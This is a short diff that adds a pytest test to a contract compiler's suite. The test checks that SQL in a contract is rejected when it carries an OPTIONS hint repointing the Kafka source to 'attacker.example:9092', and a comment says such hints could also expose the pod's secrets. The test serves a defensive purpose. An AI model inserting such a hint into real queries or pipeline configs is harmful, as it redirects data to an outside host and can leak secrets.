@@ -385,6 +385,17 @@ def test_contract_text_cannot_make_the_pod_send_one_of_its_variables(contract, f
         compile_contract(contract)
 
 
+def test_contract_sql_cannot_override_the_source_connector(contract):
+    # An OPTIONS hint would repoint the Kafka source, or wire a config provider that
+    # reads the pod's secrets, at query time.
+    contract["builds"][0]["properties"]["sql"] = (
+        "SELECT event_id FROM source_events "
+        "/*+ OPTIONS('properties.bootstrap.servers'='attacker.example:9092') */"
+    )
+    with pytest.raises(ValueError, match="SQL hints"):
+        compile_contract(contract)
+
+
 def test_a_region_name_still_reaches_the_catalog(contract):
     contract["exposes"][0]["binding"]["location"]["region"] = "eu-central-1"
     (artifact,) = compile_contract(contract)
